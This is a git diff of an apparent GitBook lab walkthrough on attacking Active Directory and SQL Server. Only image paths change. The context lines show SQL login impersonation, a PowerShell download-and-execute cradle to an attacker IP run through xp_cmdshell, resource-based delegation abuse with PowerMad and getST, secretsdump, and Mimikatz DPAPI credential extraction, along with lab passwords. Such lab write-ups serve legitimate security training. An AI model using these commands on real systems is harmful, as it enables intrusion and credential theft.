@@ -95,7 +95,7 @@ bloodhound-python -d amsterdam.bank.local -ns 10.0.0.3 -dc DC02.amsterdam.bank.l
 
 2\. We now can load the data into BloodHound by dragging the zip file into the BloodHound program and see if `Richard` can do anything useful. In the top search for the Richard user and click on it.
 
-![](<../../../.gitbook/assets/image (62) (1) (1).png>)
+![](<../../../.gitbook/assets/image (62) (1) (1) (1).png>)
 
 If you check Richard their attributes and click on the group memberships it unfolds. Richard is member of the following groups, nothing interesting there:
 
@@ -234,7 +234,7 @@ WHERE a.permission_name = 'IMPERSONATE'
 EXECUTE AS LOGIN = 'sa'
 ```
 
-![](<../../../.gitbook/assets/image (46) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (46) (1) (1) (1) (1).png>)
 
 6\. Lets try to impersonate `developer_test` and then check for sysadmin privileges and if impersonation is possible again:
 
@@ -259,7 +259,7 @@ SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER('sysadmin')
 ```
 
-![](<../../../.gitbook/assets/image (61) (1) (1).png>)
+![](<../../../.gitbook/assets/image (61) (1) (1) (1).png>)
 
 8\. We are `sa` and have sysadmin privileges. We successfully escalated our privileges from domain user to `sa` with sysadmin privileges on the SQL Server. Now we can try to get command execution on the host.
 
@@ -320,7 +320,7 @@ $str = 'IEX ((new-object net.webclient).downloadstring("http://192.168.248.2:809
 [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
 ```
 
-![](<../../../.gitbook/assets/image (71) (1) (1) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (71) (1) (1) (1) (1) (1) (1).png>)
 
 * Now we can paste the base64 encoded string in the following SQL query which will execute the base64 encoded PowerShell command:
 
@@ -351,7 +351,7 @@ One of the privilege escalation techniques that you don't see too often is by us
 crackmapexec ldap 10.0.0.3 -u richard -p Sample123 -M MAQ
 ```
 
-![](<../../../.gitbook/assets/image (71) (1) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (71) (1) (1) (1) (1) (1).png>)
 
 2\. The `MachineAccountQouta` is 10, meaning we (all authenticated users) can create our own computerobjects in the domain. So lets add our own computerobject, this can be done with [PowerMad](https://github.com/Kevin-Robertson/Powermad). First we have to download it on our attacking machine, in the same directory as our Webserver is already running:
 
@@ -509,7 +509,7 @@ For this to work you will need to fill in the IP of your kali machine, which nee
 SELECT * FROM master..sysservers;
 ```
 
-![](<../../../.gitbook/assets/image (71) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (71) (1) (1) (1) (1).png>)
 
 3\. There is one SQL link to a sql server on `data01.secure.local`. We can try to query the linked server for the SQL server version with the following query, using the openquery functionality:
 
@@ -517,7 +517,7 @@ SELECT * FROM master..sysservers;
 SELECT * FROM OPENQUERY("DATA01.SECURE.LOCAL", 'select @@version');
 ```
 
-![](<../../../.gitbook/assets/image (61) (1).png>)
+![](<../../../.gitbook/assets/image (61) (1) (1).png>)
 
 4\. We can also query the server to check if xp\_cmdshell is on so we can execute commands:
 
@@ -599,7 +599,7 @@ crackmapexec smb 10.0.0.100
 bloodhound-python -d secure.local -ns 10.0.0.100 -dc DC03.secure.local -u 'sa_sql' -p 'Iloveyou2' --zip -c all
 ```
 
-![](<../../../.gitbook/assets/image (26).png>)
+![](<../../../.gitbook/assets/image (26) (1).png>)
 
 We were able to successfully gather the BloodHound data. We can load it by dragging it into BloodHound like we did earlier. We can also find the `sa_sql` user now:
 
@@ -633,7 +633,7 @@ $creds = New-Object System.Management.Automation.PSCredential('secure.local\sa_s
 
 The credentials are saved in the `$creds` variable now:
 
-![](<../../../.gitbook/assets/image (46) (1) (1).png>)
+![](<../../../.gitbook/assets/image (46) (1) (1) (1).png>)
 
 6\. Now we can use PowerView to query the domain controller from `secure.local` for the domain-object `DATA01` and retrieve the samaccountname and Owner attribute. We will receive a SID which we need to resolve as well;
 
@@ -654,7 +654,7 @@ Set-DomainObjectOwner -Domain secure.local -Credential $creds -Server 10.0.0.100
 
 We didn't received any output, but we can execute the commands again to see who the owner is now.
 
-![](<../../../.gitbook/assets/image (19) (1) (1).png>)
+![](<../../../.gitbook/assets/image (19) (1) (1) (1).png>)
 
 The owner successfully changed.
 
@@ -751,7 +751,7 @@ Get-DomainComputer -Domain secure.local -Credential $creds -Server 10.0.0.100 S-
 getST.py secure/FAKE01@10.0.0.100 -spn cifs/data01.secure.local -impersonate administrator -dc-ip 10.0.0.100
 ```
 
-![](<../../../.gitbook/assets/image (71) (1) (1).png>)
+![](<../../../.gitbook/assets/image (71) (1) (1) (1).png>)
 
 Now we can use the ticket and authenticate with tools that support these, most (if not all) impacket tools support this. So we can run secretsdump.py to retrieve the local useraccount hashes.
 
@@ -852,7 +852,7 @@ If we now run the same Mimikatz.exe command we receive the masterkey:
 ./mimikatz.exe "dpapi::masterkey /in:C:\Users\sa_sql\AppData\Roaming\Microsoft\Protect\S-1-5-21-1498997062-1091976085-892328878-1106\e1f462bb-9a65-40f0-a144-4f64bea97ce2 /sid:S-1-5-21-1498997062-1091976085-892328878-1106 /password:Iloveyou2 /protected" "exit"
 ```
 
-![](<../../../.gitbook/assets/image (62).png>)
+![](<../../../.gitbook/assets/image (62) (1).png>)
 
 7\. Now we can read the saved credentials with the masterkey using the following Mimikatz command:
 
@@ -868,7 +868,7 @@ We recived a credentials for the `sa_backup` user, the password is `LS6RV5o8T9`.
 crackmapexec smb 10.0.0.100 -u sa_backup -p LS6RV5o8T9
 ```
 
-![](<../../../.gitbook/assets/image (46) (1).png>)
+![](<../../../.gitbook/assets/image (46) (1) (1).png>)
 
 The login is succesfull, so the password is correct. The last thing to do is to remove the tools we placed on the machine and we should disable RDP again to not leave any changes to the system.
 
